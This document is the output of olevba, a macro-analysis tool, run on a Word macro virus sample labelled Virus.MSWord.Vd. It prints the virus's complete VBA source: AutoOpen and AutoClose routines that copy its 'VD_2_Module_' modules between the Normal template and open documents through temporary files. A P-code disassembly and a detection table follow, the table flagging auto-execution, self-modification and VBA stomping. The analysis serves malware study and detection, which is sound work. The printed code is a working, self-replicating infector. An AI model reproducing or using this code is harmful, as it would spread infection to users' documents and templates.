olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Vd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VD_2_Module_1_qwertyuiop.bas 
in file: Virus.MSWord.Vd - OLE stream: 'Macros/VBA/VD_2_Module_1_qwertyuiop'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
  N_I = Normal_Infected(Count)
  A_I = Active_Infected(Count)
  If N_I And A_I Then
    Exit Sub
  ElseIf N_I Then
    Flag = Export_From_Normal()
  ElseIf A_I Then
    Flag = Export_From_Active()
  End If
End Sub
Sub AutoClose()
  N_I = Normal_Infected(Count)
  A_I = Active_Infected(Count)
  If N_I And A_I Then
    Exit Sub
  ElseIf N_I Then
    Flag = Import_In_Active(ErrorCode)
    If Not Flag Then MsgBox "Error Code " + Str$(ErrorCode), , "Import_In_Active"
  ElseIf A_I Then
    Flag = Import_In_Normal(ErrorCode)
    If Not Flag Then MsgBox "Error Code " + Str$(ErrorCode), , "Import_In_Normal"
  End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VD_2_Module_2_qwertyuiop.bas 
in file: Virus.MSWord.Vd - OLE stream: 'Macros/VBA/VD_2_Module_2_qwertyuiop'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function Normal_Infected(CountOurModulesInNormal) As Boolean
  Counter = NormalTemplate.VBProject.VBComponents.Count
  If Counter > 1 Then
    For i = 1 To Counter
      If Left$(NormalTemplate.VBProject.VBComponents.Item(i).Name, 12) = "VD_2_Module_" Then
        Flag = True
        CountOurModulesInNormal = CountOurModulesInNormal + 1
      End If
    Next
  End If
  Normal_Infected = Flag
End Function
Function Active_Infected(CountOurModulesInActive) As Boolean
  Counter = ActiveDocument.VBProject.VBComponents.Count
  If Counter > 1 Then
    For i = 1 To Counter
      If Left$(ActiveDocument.VBProject.VBComponents.Item(i).Name, 12) = "VD_2_Module_" Then
        Flag = True
        CountOurModulesInActive = CountOurModulesInActive + 1
      End If
    Next
  End If
  Active_Infected = Flag
End Function
Function Export_From_Normal() As Boolean
  On Error GoTo CheckError
  Counter = NormalTemplate.VBProject.VBComponents.Count
  If Counter > 1 Then
    For i = 1 To Counter
      Det = Left$(NormalTemplate.VBProject.VBComponents.Item(i).Name, 13)
      If Left$(Det, 12) = "VD_2_Module_" Then
        FileName = Application.StartupPath + Det + ".tmp"
        NormalTemplate.VBProject.VBComponents.Item(i).Export (FileName)
      End If
    Next
    Export_From_Normal = True
  End If
CheckError:
End Function
Function Export_From_Active() As Boolean
  On Error GoTo CheckError
  Counter = ActiveDocument.VBProject.VBComponents.Count
  If Counter > 1 Then
    For i = 1 To Counter
      Det = Left$(ActiveDocument.VBProject.VBComponents.Item(i).Name, 13)
      If Left$(Det, 12) = "VD_2_Module_" Then
        FileName = Application.StartupPath + "\" + Det + ".tmp"
        ActiveDocument.VBProject.VBComponents.Item(i).Export (FileName)
      End If
    Next
    Export_From_Active = True
  End If
CheckError:
End Function
Function Import_In_Normal(ErrorCode) As Boolean
  On Error GoTo CheckError
  Flag = Active_Infected(Count)
  For i = 1 To Count
    FileName = Application.StartupPath + "\VD_2_Module_" + LTrim$(Str$(i)) + ".tmp"
    NormalTemplate.VBProject.VBComponents.Import (FileName)
  Next
  Import_In_Normal = True
  Exit Function
CheckError:
  Import_In_Normal = False
  ErrorCode = Err
End Function
Function Import_In_Active(ErrorCode) As Boolean
  On Error GoTo CheckError
  Flag = Normal_Infected(Count)
  For i = 1 To Count
    FileName = Application.StartupPath + "\VD_2_Module_" + LTrim$(Str$(i)) + ".tmp"
    ActiveDocument.VBProject.VBComponents.Import (FileName)
  Next
  Import_In_Active = True
  Exit Function
CheckError:
  Import_In_Active = False
  ErrorCode = Err
End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Vd
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/VD_2_Module_1_qwertyuiop - 1760 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	Ld Count 
' 	ArgsLd Normal_Infected 0x0001 
' 	St N_I 
' Line #2:
' 	Ld Count 
' 	ArgsLd Active_Infected 0x0001 
' 	St A_I 
' Line #3:
' 	Ld N_I 
' 	Ld A_I 
' 	And 
' 	IfBlock 
' Line #4:
' 	ExitSub 
' Line #5:
' 	Ld N_I 
' 	ElseIfBlock 
' Line #6:
' 	ArgsLd Export_From_Normal 0x0000 
' 	St Flag 
' Line #7:
' 	Ld A_I 
' 	ElseIfBlock 
' Line #8:
' 	ArgsLd Export_From_Active 0x0000 
' 	St Flag 
' Line #9:
' 	EndIfBlock 
' Line #10:
' 	EndSub 
' Line #11:
' 	FuncDefn (Sub AutoClose())
' Line #12:
' 	Ld Count 
' 	ArgsLd Normal_Infected 0x0001 
' 	St N_I 
' Line #13:
' 	Ld Count 
' 	ArgsLd Active_Infected 0x0001 
' 	St A_I 
' Line #14:
' 	Ld N_I 
' 	Ld A_I 
' 	And 
' 	IfBlock 
' Line #15:
' 	ExitSub 
' Line #16:
' 	Ld N_I 
' 	ElseIfBlock 
' Line #17:
' 	Ld ErrorCode 
' 	ArgsLd Import_In_Active 0x0001 
' 	St Flag 
' Line #18:
' 	Ld Flag 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000B "Error Code "
' 	Ld ErrorCode 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	ParamOmitted 
' 	LitStr 0x0010 "Import_In_Active"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #19:
' 	Ld A_I 
' 	ElseIfBlock 
' Line #20:
' 	Ld ErrorCode 
' 	ArgsLd Import_In_Normal 0x0001 
' 	St Flag 
' Line #21:
' 	Ld Flag 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000B "Error Code "
' 	Ld ErrorCode 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	ParamOmitted 
' 	LitStr 0x0010 "Import_In_Normal"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	EndSub 
' Macros/VBA/VD_2_Module_2_qwertyuiop - 4222 bytes
' Line #0:
' 	FuncDefn (Function Normal_Infected(CountOurModulesInNormal) As Boolean)
' Line #1:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St Counter 
' Line #2:
' 	Ld Counter 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #3:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Counter 
' 	For 
' Line #4:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitDI2 0x000C 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x000C "VD_2_Module_"
' 	Eq 
' 	IfBlock 
' Line #5:
' 	LitVarSpecial (True)
' 	St Flag 
' Line #6:
' 	Ld CountOurModulesInNormal 
' 	LitDI2 0x0001 
' 	Add 
' 	St CountOurModulesInNormal 
' Line #7:
' 	EndIfBlock 
' Line #8:
' 	StartForVariable 
' 	Next 
' Line #9:
' 	EndIfBlock 
' Line #10:
' 	Ld Flag 
' 	St Normal_Infected 
' Line #11:
' 	EndFunc 
' Line #12:
' 	FuncDefn (Function Active_Infected(CountOurModulesInActive) As Boolean)
' Line #13:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St Counter 
' Line #14:
' 	Ld Counter 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #15:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Counter 
' 	For 
' Line #16:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitDI2 0x000C 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x000C "VD_2_Module_"
' 	Eq 
' 	IfBlock 
' Line #17:
' 	LitVarSpecial (True)
' 	St Flag 
' Line #18:
' 	Ld CountOurModulesInActive 
' 	LitDI2 0x0001 
' 	Add 
' 	St CountOurModulesInActive 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	StartForVariable 
' 	Next 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	Ld Flag 
' 	St Active_Infected 
' Line #23:
' 	EndFunc 
' Line #24:
' 	FuncDefn (Function Export_From_Normal() As Boolean)
' Line #25:
' 	OnError CheckError 
' Line #26:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St Counter 
' Line #27:
' 	Ld Counter 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Counter 
' 	For 
' Line #29:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitDI2 0x000D 
' 	ArgsLd LBound$ 0x0002 
' 	St Det 
' Line #30:
' 	Ld Det 
' 	LitDI2 0x000C 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x000C "VD_2_Module_"
' 	Eq 
' 	IfBlock 
' Line #31:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld Det 
' 	Add 
' 	LitStr 0x0004 ".tmp"
' 	Add 
' 	St FileName 
' Line #32:
' 	Ld FileName 
' 	Paren 
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	StartForVariable 
' 	Next 
' Line #35:
' 	LitVarSpecial (True)
' 	St Export_From_Normal 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	Label CheckError 
' Line #38:
' 	EndFunc 
' Line #39:
' 	FuncDefn (Function Export_From_Active() As Boolean)
' Line #40:
' 	OnError CheckError 
' Line #41:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St Counter 
' Line #42:
' 	Ld Counter 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #43:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Counter 
' 	For 
' Line #44:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitDI2 0x000D 
' 	ArgsLd LBound$ 0x0002 
' 	St Det 
' Line #45:
' 	Ld Det 
' 	LitDI2 0x000C 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x000C "VD_2_Module_"
' 	Eq 
' 	IfBlock 
' Line #46:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld Det 
' 	Add 
' 	LitStr 0x0004 ".tmp"
' 	Add 
' 	St FileName 
' Line #47:
' 	Ld FileName 
' 	Paren 
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	StartForVariable 
' 	Next 
' Line #50:
' 	LitVarSpecial (True)
' 	St Export_From_Active 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	Label CheckError 
' Line #53:
' 	EndFunc 
' Line #54:
' 	FuncDefn (Function Import_In_Normal(ErrorCode) As Boolean)
' Line #55:
' 	OnError CheckError 
' Line #56:
' 	Ld Count 
' 	ArgsLd Active_Infected 0x0001 
' 	St Flag 
' Line #57:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Count 
' 	For 
' Line #58:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\VD_2_Module_"
' 	Add 
' 	Ld i 
' 	ArgsLd Str$ 0x0001 
' 	ArgsLd LTrim$ 0x0001 
' 	Add 
' 	LitStr 0x0004 ".tmp"
' 	Add 
' 	St FileName 
' Line #59:
' 	Ld FileName 
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #60:
' 	StartForVariable 
' 	Next 
' Line #61:
' 	LitVarSpecial (True)
' 	St Import_In_Normal 
' Line #62:
' 	ExitFunc 
' Line #63:
' 	Label CheckError 
' Line #64:
' 	LitVarSpecial (False)
' 	St Import_In_Normal 
' Line #65:
' 	Ld Err 
' 	St ErrorCode 
' Line #66:
' 	EndFunc 
' Line #67:
' 	FuncDefn (Function Import_In_Active(ErrorCode) As Boolean)
' Line #68:
' 	OnError CheckError 
' Line #69:
' 	Ld Count 
' 	ArgsLd Normal_Infected 0x0001 
' 	St Flag 
' Line #70:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Count 
' 	For 
' Line #71:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\VD_2_Module_"
' 	Add 
' 	Ld i 
' 	ArgsLd Str$ 0x0001 
' 	ArgsLd LTrim$ 0x0001 
' 	Add 
' 	LitStr 0x0004 ".tmp"
' 	Add 
' 	St FileName 
' Line #72:
' 	Ld FileName 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #73:
' 	StartForVariable 
' 	Next 
' Line #74:
' 	LitVarSpecial (True)
' 	St Import_In_Active 
' Line #75:
' 	ExitFunc 
' Line #76:
' 	Label CheckError 
' Line #77:
' 	LitVarSpecial (False)
' 	St Import_In_Active 
' Line #78:
' 	Ld Err 
' 	St ErrorCode 
' Line #79:
' 	EndFunc 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

